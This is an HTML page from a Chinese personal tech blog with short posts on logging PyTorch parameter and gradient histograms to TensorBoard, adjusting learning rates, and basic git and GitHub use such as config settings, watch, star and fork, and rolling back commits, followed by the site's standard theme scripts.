<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将模型置于训练模式</span></span><br><span class="line">model.train()</span><br><span class="line">output = model(input_data)</span><br><span class="line"></span><br><span class="line">writer = SummaryWriter(comment=<span class="string">'测试文件'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 标准的训练</span></span><br><span class="line">model.train()</span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    optimizer.zero_grad()</span><br><span class="line">    output_data = model(input_data)</span><br><span class="line">    loss = F.cross_entropy(output_data,label)</span><br><span class="line">    pred = output_data.data.max(<span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">    acc = pred.eq(label).sum()</span><br><span class="line">    loss.backward()</span><br><span class="line">    optimizer.step()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 在每一轮的训练中都记录各层的各个参数值和梯度分布，写入tensrboard日志文件</span></span><br><span class="line">    <span class="keyword">for</span> tag, value <span class="keyword">in</span> model.named_parameters():</span><br><span class="line">        tag = tag.replace(<span class="string">'.'</span>, <span class="string">'/'</span>)</span><br><span class="line">        <span class="comment"># 记录各层的参数值</span></span><br><span class="line">        writer.add_histogram(tag, value.data.cpu().numpy(), epoch)</span><br><span class="line">        <span class="comment"># 记录各层的梯度</span></span><br><span class="line">        writer.add_histogram(tag+<span class="string">'/grad'</span>, value.grad.data.cpu().numpy(), epoch)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 关闭tensorboard写入器</span></span><br><span class="line">writer.close()</span><br></pre></td></tr></table></figure>
<p>​    最终效果如下图所示。</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/tensorboard训练中参数和提取情况图.png?raw=True alt=" alt=" tensorboard损失函数、准确率迭代图.png" title="tensorboard成功部署页面.png&quot; style=&quot;zoom:25%; " style="zoom:45%;"></p>
<blockquote>
<p>注：在histogram中，横轴表示值，纵轴表示数量，各条线表示不同的时间线(step\epoch)，将鼠标停留在一个点上，会加黑显示三个数字，含义是：在step xxx1时，有xxx2个元素的值（约等于）xxx3。</p>
</blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/14/pytorch——自动更新学习速率/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="AnchoretY">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="AnchoretY's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/11/14/pytorch——自动更新学习速率/" itemprop="url">pytorch——自动更新学习速率</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-14T23:42:32+08:00">
                2019-11-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>​    在深度学习模型的梯度下降过程中，前期的梯度通常较大，因此一可以使参数的更新更快一些，参数更新的后去，梯度较小，因此可以让更新的速率慢一些进行精确的下降，而直接使用optimizer只能直接将lr(学习速率)设置为固定值，因此常常会遇到需要手动进行学习速率调节的情况，本文重点讲解如何自己编写动态调节模型学习速率。</p>
<p>​    </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/13/github基本使用-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="AnchoretY">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="AnchoretY's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/11/13/github基本使用-1/" itemprop="url">github基本使用</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-13T23:21:19+08:00">
                2019-11-13
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>​    之前对github一直就是简单的使用，最近找完工作终于优势间静下来好好地研究下github和git，这个系列博客就用来记录在github学习过程中的新get到的一些点。</p>
<h3 id="1-Git邮箱姓名设置"><a href="#1-Git邮箱姓名设置" class="headerlink" title="1.Git邮箱姓名设置"></a>1.Git邮箱姓名设置</h3><p>​    在我们最开始进行本地git设置时，一般都要使用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name "xxx"</span><br><span class="line">git config --gobal user.email "xxx"</span><br></pre></td></tr></table></figure>
<p>进行姓名和邮箱设置，对这个已知都是使用自己的常用邮箱和真实名，对于安全专业的硕士真是是很蠢的行为。</p>
<blockquote>
<p><strong>这里设置的姓名和邮箱都是会在github上公开仓库时随着日志一起进行公开的！因此不要使用隐私的信息</strong></p>
</blockquote>
<p>​    要进行更改可以直接修改~/.gitconfig中的内容进行重新设置。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[user]</span><br><span class="line">	name = “abc”</span><br><span class="line">	email = xxx@qq.com</span><br></pre></td></tr></table></figure>
<h3 id="2-github中的watch、star、fork"><a href="#2-github中的watch、star、fork" class="headerlink" title="2.github中的watch、star、fork"></a>2.github中的watch、star、fork</h3><p>​    用好github正确的使用好watch、star、fork是非常重要的一步，这关系到你能不能正确的进行喜欢项目的跟踪。下面是对这三张常见的操作进行的介绍：</p>
<h4 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h4><p>​    watch即观察该项目，对一个项目选择观察后只要有任何人在该项目下面提交了issue或者issue下面有了任何留言，通知中心就会进行通知，如果设置了个人邮箱，邮箱同时也会受到通知。</p>
<blockquote>
<p><a href="https://github.com/cssmagic/blog/issues/49" target="_blank" rel="noopener">如何正确的接收watching 通知消息</a>推荐看这一篇文章</p>
</blockquote>
<h4 id="Star"><a href="#Star" class="headerlink" title="Star"></a>Star</h4><p>​    Star意思是对项目打星标（也就是点赞）,一个项目的点赞数目的多少很大程度上是衡量一个项目质量的显而易见的指标。</p>
<blockquote>
<p> Star后的项目会专门加入一个列表，在个人管理中可以回看自己Star的项目。</p>
</blockquote>
<h4 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h4><p>​    使用fork相当于你对该项目拥有了一份自己的拷贝，拷贝是基于当时的项目文件，后续项目发生变化需要通过其他方式去同步。</p>
<blockquote>
<p>使用很少，除非是想在一个项目的基础上想建设自己的项目才会用到</p>
</blockquote>
<h4 id="使用建议"><a href="#使用建议" class="headerlink" title="使用建议"></a>使用建议</h4><blockquote>
<p>1.对于一些不定期更新新功能的好项目使用watch进行关注</p>
<p>2.认为一个项目做得不错，使用star进行点赞</p>
<p>3.在一个项目的基础上想建设自己的项目，使用fork</p>
</blockquote>
<h3 id="3-Git版本回退"><a href="#3-Git版本回退" class="headerlink" title="3.Git版本回退"></a>3.Git版本回退</h3><h4 id="已经进行add，但还没有进行commit"><a href="#已经进行add，但还没有进行commit" class="headerlink" title="已经进行add，但还没有进行commit"></a>已经进行add，但还没有进行commit</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git status 先看一下add 中的文件 </span><br><span class="line">git reset HEAD 如果后面什么都不跟的话 就是上一次add 里面的全部撤销了 </span><br><span class="line">git reset HEAD XXX/XXX/XXX.java 就是对某个文件进行撤销了</span><br></pre></td></tr></table></figure>
<h4 id="本地已经进行了commit，但是还没有更新到远程分支"><a href="#本地已经进行了commit，但是还没有更新到远程分支" class="headerlink" title="本地已经进行了commit，但是还没有更新到远程分支"></a>本地已经进行了commit，但是还没有更新到远程分支</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先找到要进行会退的版本id</span></span><br><span class="line">git log    </span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行本地仓库回退</span></span><br><span class="line">git reset --hard 提交的编号</span><br></pre></td></tr></table></figure>
<h4 id="远程分支已进行进行同步"><a href="#远程分支已进行进行同步" class="headerlink" title="远程分支已进行进行同步"></a>远程分支已进行进行同步</h4><p>​    其实就是先进性本地分支回退，然后将本都分支强制push到远程。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先找到要进行会退的版本id</span></span><br><span class="line">git log    </span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行本地仓库回退</span></span><br><span class="line">git reset --hard 提交的编号</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制将本地分支push到远程</span></span><br><span class="line">git push -f</span><br></pre></td></tr></table></figure>
<p>​    </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">AnchoretY</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">126</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">19</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">45</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <!-- 底部导航栏相关 -->
<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">AnchoretY</span>

  
</div>

<!-- 添加底部导航栏-->
<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客数:<span id="busuanzi_value_site_uv"></span>
</span>
</div>

  <script src='https://unpkg.com/mermaid@7.1.2/dist/mermaid.min.js'></script>
  <script>
    if (window.mermaid) {
      mermaid.initialize("");
    }
  </script>


        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
  


  

  

</body>
</html>
